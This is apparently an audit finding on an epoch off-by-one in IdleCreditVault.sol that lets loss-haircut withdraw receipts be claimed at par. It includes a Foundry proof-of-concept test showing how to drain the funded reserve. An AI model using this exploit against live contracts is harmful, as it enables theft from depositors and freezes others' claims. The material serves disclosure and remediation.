### Title
Stale epoch marker makes loss-adjusted withdraw receipts claimable at par — (`contracts/strategies/idle/IdleCreditVault.sol`)

### Summary
`IdleCreditVault` records a user's withdraw-request epoch in `lastWithdrawRequest[_user]` / `withdrawsRequestsByEpoch[_user][epoch]` at request time, but `collectWithdrawFunds` keys the haircut under `lossRecoveryPriceByEpoch[epochNumber]` evaluated *after* `stopEpoch`/`stopEpochWithDuration` has already bumped `epochNumber` via `deposit()`. The loss-adjusted claim path `_claimLossAdjustedWithdrawRequest` looks up `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]`, i.e. the pre-increment epoch, finds 0, and silently skips the haircut. The receipt then falls through to `_claimFundedWithdrawRequest`, which pays the full un-haircut `withdrawsRequests[_user]` basis at par from a strategy balance that only holds the reduced `pendingToFund` amount. The analog of CVE-2016-5276's stale-reference use-after-free: a receipt created under one epoch's accounting is redeemed against a different epoch's state, so the haircut is never applied.

### Finding Description
- `requestWithdraw` stores `lastWithdrawRequest[_user] = currentEpoch` and `withdrawsRequestsByEpoch[_user][currentEpoch] += _amount` where `currentEpoch` is the pre-stop `epochNumber` [1](#0-0) .
- During `stopEpochWithDuration`, the CDO calls `strategy.deposit(...)` while the epoch is still running, which executes `epochNumber += 1` [2](#0-1) , and only then calls `collectWithdrawFunds`, which stores `lossRecoveryPriceByEpoch[epochNumber]` under the *post-increment* epoch [3](#0-2) .
- On claim, `_claimLossAdjustedWithdrawRequest` reads `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]` — the request-time epoch — gets 0 and returns without clearing or haircutting [4](#0-3) .
- `_claimFundedWithdrawRequest` then passes its gate (`epochNumber > lastWithdrawRequest[_user]`) and pays the aggregate `withdrawsRequests[_user]` at par via `_transferFundedClaim` [5](#0-4) . The test suite itself encodes the off-by-one: `claimEpoch = strategy.epochNumber() + 1` is computed before the request, confirming the claim/loss epoch index differs from the request marker [6](#0-5) .

### Impact Explanation
When `stopEpochWithDuration` realizes a loss, only `pendingToFund = pendingBasis - pendingLoss` underlying is pulled into the strategy, but every affected receipt still claims its full pre-loss basis. The first claimer(s) withdraw at par and drain the funded reserve; later claimants of the same loss epoch — and holders of other funded receipts — find the strategy undercollateralized and revert on transfer. This is direct theft of the funded-withdraw reserve up to the unapplied `pendingLoss`, plus permanent freezing of the remaining receipts (broken one-receipt-one-payout and fair-loss-socialization invariants).

### Likelihood Explanation
Requires only a `stopEpochWithDuration` with `_lossAmount > 0` while pending withdraw receipts exist — an honest-manager action in a normal mode, not an edge state (no default, no KYC bypass, attacker is any withdraw requester). No existing guard stops it: `collectWithdrawFunds` accepts the partial funding by design, the revert on `lossRecoveryPrice == 0` only covers subprecision rounding, and the claim path has no check that the loss epoch key matches `lastWithdrawRequest`.

### Recommendation
Key `lossRecoveryPriceByEpoch` by the same epoch identifier stored in `lastWithdrawRequest`/`withdrawsRequestsByEpoch` (i.e., snapshot `epochNumber` before the stop-time increment, or record requests under the post-stop claim epoch), and in `_claimLossAdjustedWithdrawRequest` revert rather than silently fall through when `withdrawsRequestsByEpoch[_user]` is non-zero but the lookup epoch has no recovery price.

### Proof of Concept
```solidity
// Fork PoC (foundry.toml profile), modeled on test/foundry/IdleCreditVault.t.sol
// and IdleCDOEpochQueue.t.sol testProcessWithdrawalClaimsZeroPayoutDoesNotBlockLaterClaims.
function testLossAdjustedReceiptPaysAtPar() external {
    uint256 amount = 10_000 * ONE_SCALE;
    idleCDO.depositAA(amount);              // honest seed liquidity
    _startEpochAndCheckPrices(0);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    deal(underlying, borrower, expectedInterest);
    cdoEpoch.stopEpoch(0, 0);               // epochNumber -> E+1 buffer

    // Attacker (any tranche holder) requests a normal withdraw in the buffer.
    uint256 req = cdoEpoch.requestWithdraw(IERC20(AAtranche).balanceOf(address(this)) / 2, address(AAtranche));
    assertEq(creditVault.lastWithdrawRequest(address(this)), creditVault.epochNumber()); // epoch E+1

    // Honest manager runs epoch, then stops with a realized loss so the pending
    // bucket is only partially funded.
    _startEpochAndCheckPrices(1);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    uint256 pendingBasis = creditVault.pendingWithdraws();
    uint256 totalBasis = cdoEpoch.getContractValue() + cdoEpoch.expectedEpochInterest() + pendingBasis;
    uint256 lossAmount = totalBasis / 2;    // 50% loss
    (uint256 pendingToFund, ) = creditVault.previewLossAdjustedWithdrawFunds(lossAmount);
    deal(underlying, borrower, cdoEpoch.expectedEpochInterest() + pendingToFund);
    vm.prank(borrower); underlying.approve(address(cdoEpoch), type(uint256).max);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(10e18, 0, cdoEpoch.epochDuration(), lossAmount);

    // The haircut was stored under the post-increment epochNumber (E+2), while
    // lastWithdrawRequest == E+1, so the loss-adjusted path is skipped.
    assertGt(creditVault.lossRecoveryPriceByEpoch(creditVault.epochNumber()), 0);
    uint256 fundedBal = underlying.balanceOf(address(creditVault)); // == pendingToFund (< req basis)
    uint256 balPre = underlying.balanceOf(address(this));
    cdoEpoch.claimWithdrawRequest();        // pays `req` at PAR, not `req * lossRecoveryPrice`
    uint256 paid = underlying.balanceOf(address(this)) - balPre;
    assertGt(paid, req * creditVault.lossRecoveryPriceByEpoch(creditVault.epochNumber()) / 1e18);
    // Reserve drained: paid > fundedBal available for other receipts -> insolvency/freeze.
}
```

```text
  function _claimFundedWithdrawRequest(address _user) internal returns (uint256 amount) {
    // User should wait at least an epoch before claiming the withdraw. Once the epoch is over user can withdraw 
    // at any time even if a new epoch started. 
    // So if epochNumber is the same as the last withdraw request then we revert. Epoch number is increased at stopEpoch
    // NOTE: If a user does not claim a withdraw request and instead requests another withdraw, he will have to wait
    // for another epoch to claim both requests.
    // NOTE 2: if borrower defaults, old withdraw requests can still be claimed
    if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
      revert NotAllowed();
    }
    // settle APR=0 requests once the related epoch has ended
    _settleApr0(_user);
    Apr0UserData storage _apr0User = apr0Users[_user];
    // Claim includes:
    // - settled APR0 principal from finalized epochs
    // - still-open APR0 principal: if pool-close mode was used (_interest == 1), IdleCDO sets
    //   epochEndDate = 0 and claims can be immediate, while _settleApr0 can still skip settlement
    //   for the current request epoch (reqEpoch >= epochNumber).
    // - settled APR0 interest
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
    }
    _transferFundedClaim(_user, amount);
```

```text
  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
```
